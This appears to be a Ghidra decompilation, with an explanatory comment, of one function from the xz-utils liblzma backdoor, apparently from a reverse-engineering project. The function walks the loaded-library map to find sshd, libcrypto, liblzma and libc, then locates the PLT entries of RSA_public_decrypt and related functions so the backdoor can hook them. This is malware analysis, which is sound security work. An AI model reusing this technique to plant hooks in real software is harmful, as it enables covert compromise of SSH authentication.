// /home/kali/xzre-ghidra/xzregh/104660_process_shared_libraries_map.c
// Function: process_shared_libraries_map @ 0x104660
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries_map(link_map * r_map, backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Walks `r_debug->r_map` and classifies each entry by basename, aborting on duplicates or malformed maps. Only after locating sshd (the main binary), libcrypto, ld-linux, libsystemd, liblzma, and libc does it parse the ELF images: sshd’s PLT is interrogated to recover `RSA_public_decrypt`, `EVP_PKEY_set1_RSA`, and `RSA_get0_key`, liblzma’s RW data segment is recorded so the `backdoor_hooks_data_t` blob and `hooks_data_addr` can be cached, libcrypto/libc descriptors are primed for later walkers, and libc’s import table is filled via `resolve_libc_imports`. The result is a fully-populated `backdoor_shared_libraries_data_t` for downstream stages.
 */

#include "xzre_types.h"

BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)

{
  char cVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  elf_info_t *peVar5;
  link_map *plVar6;
  backdoor_data_t *pbVar7;
  backdoor_hooks_data_t **ppbVar8;
  EncodedStringId EVar9;
  BOOL BVar10;
  Elf64_Sym *pEVar11;
  uchar *puVar12;
  ulong *puVar13;
  void *pvVar14;
  char *string_end;
  char *string_begin;
  u64 local_30;
  
  if (r_map == (link_map *)0x0) {
    return FALSE;
  }
  pEVar11 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
  if (pEVar11 == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  do {
    if (*(ulong *)(r_map + 0x18) == 0) {
      pbVar7 = data->data;
      if (pbVar7->main_map == (link_map *)0x0) {
        return FALSE;
      }
      if (pbVar7->libcrypto_map == (link_map *)0x0) {
        return FALSE;
      }
      if (pbVar7->dynamic_linker_map == (link_map *)0x0) {
        return FALSE;
      }
      if (pbVar7->libsystemd_map == (link_map *)0x0) {
        return FALSE;
      }
      if (pbVar7->liblzma_map == (link_map *)0x0) {
        return FALSE;
      }
      if (pbVar7->libc_map == (link_map *)0x0) {
        return FALSE;
      }
      break;
    }
    if (*(ulong *)r_map == 0) {
      return FALSE;
    }
    string_end = *(char **)(r_map + 8);
    if (string_end == (char *)0x0) {
      return FALSE;
    }
    if (*(ulong *)(r_map + 0x10) == 0) {
      return FALSE;
    }
    string_begin = string_end;
    if (*string_end == '\0') {
      if (data->data->main_map != (link_map *)0x0) {
        return FALSE;
      }
      data->data->main_map = r_map;
    }
    else {
      while (cVar1 = *string_end, cVar1 != '\0') {
        string_end = string_end + 1;
        if (cVar1 == '/') {
          string_begin = string_end;
        }
      }
      EVar9 = get_string_id(string_begin,string_end);
      pbVar7 = data->data;
      if (EVar9 == STR_libc_so) {
        if (pbVar7->libc_map != (link_map *)0x0) {
          return FALSE;
        }
        pbVar7->libc_map = r_map;
      }
      else if (EVar9 < 0x7d1) {
        if (EVar9 == STR_liblzma_so) {
          if (pbVar7->liblzma_map != (link_map *)0x0) {
            return FALSE;
          }
          if (0x10465f < *(ulong *)r_map) {
            return FALSE;
          }
          if ((code *)(*(ulong *)r_map + 0x400000) < process_shared_libraries_map) {
            return FALSE;
          }
          if (*(ulong *)(r_map + 0x18) == 0) {
            return FALSE;
          }
          pbVar7->liblzma_map = r_map;
        }
        else if (EVar9 == STR_libcrypto_so) {
          if (pbVar7->libcrypto_map != (link_map *)0x0) {
            return FALSE;
          }
          pbVar7->libcrypto_map = r_map;
        }
      }
      else if (EVar9 == STR_libsystemd_so) {
        if (pbVar7->libsystemd_map != (link_map *)0x0) {
          return FALSE;
        }
        pbVar7->libsystemd_map = r_map;
      }
      else if (EVar9 == STR_ld_linux_x86_64_so) {
        if (pbVar7->dynamic_linker_map != (link_map *)0x0) {
          return FALSE;
        }
        peVar5 = data->elf_handles->dynamic_linker;
        puVar12 = peVar5->elfbase->e_ident + pEVar11->st_value;
        if (r_map <= puVar12) {
          return FALSE;
        }
        if (pEVar11->st_size < (ulong)((long)r_map - (long)puVar12)) {
          return FALSE;
        }
        if (*(Elf64_Dyn **)(r_map + 0x10) != peVar5->dyn) {
          return FALSE;
        }
        pbVar7->dynamic_linker_map = r_map;
      }
    }
    pbVar7 = data->data;
    r_map = *(link_map **)(r_map + 0x18);
  } while ((((pbVar7->main_map == (link_map *)0x0) || (pbVar7->libcrypto_map == (link_map *)0x0)) ||
           (pbVar7->dynamic_linker_map == (link_map *)0x0)) ||
          (((pbVar7->libsystemd_map == (link_map *)0x0 || (pbVar7->liblzma_map == (link_map *)0x0))
           || (pbVar7->libc_map == (link_map *)0x0))));
  puVar2 = (undefined8 *)data->RSA_get0_key_plt;
  puVar3 = (undefined8 *)data->EVP_PKEY_set1_RSA_plt;
  puVar4 = (undefined8 *)data->RSA_public_decrypt_plt;
  peVar5 = data->elf_handles->main;
  plVar6 = data->data->main_map;
  if (plVar6 == (link_map *)0x0) {
    return FALSE;
  }
  BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5);
  if (BVar10 == FALSE) {
    return FALSE;
  }
  if (peVar5->gnurelro_found == FALSE) {
    return FALSE;
  }
  if ((peVar5->flags & 0x20) == 0) {
    return FALSE;
  }
  puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_public_decrypt);
  *puVar4 = puVar13;
  if (puVar13 < (ulong *)0x1000000) {
    puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_EVP_PKEY_set1_RSA);
    *puVar3 = puVar13;
    if (((ulong *)0xffffff < puVar13) && (0xffffff < *puVar13)) {
      return FALSE;
    }
    puVar13 = (ulong *)elf_get_plt_symbol(peVar5,STR_RSA_get0_key);
    *puVar2 = puVar13;
    if (puVar13 < (ulong *)0x1000000) goto LAB_00104924;
  }
  if (0xffffff < *puVar13) {
    return FALSE;
  }
LAB_00104924:
  plVar6 = data->data->libcrypto_map;
  if ((plVar6 != (link_map *)0x0) &&
     (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libcrypto), BVar10 != FALSE)) {
    ppbVar8 = data->hooks_data_addr;
    local_30 = 0;
    peVar5 = data->elf_handles->liblzma;
    plVar6 = data->data->liblzma_map;
    if ((plVar6 != (link_map *)0x0) &&
       (((BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5), BVar10 != FALSE &&
         ((peVar5->flags & 0x20) != 0)) &&
        (pvVar14 = elf_get_data_segment(peVar5,&local_30,TRUE), 0x597 < local_30)))) {
      *ppbVar8 = (backdoor_hooks_data_t *)((long)pvVar14 + 0x10);
      *(u64 *)((long)pvVar14 + 0x590) = local_30 - 0x598;
      plVar6 = data->data->libc_map;
      if ((plVar6 != (link_map *)0x0) &&
         (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libc), BVar10 != FALSE)) {
        BVar10 = resolve_libc_imports
                           (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
        return (uint)(BVar10 != FALSE);
      }
    }
  }
  return FALSE;
}

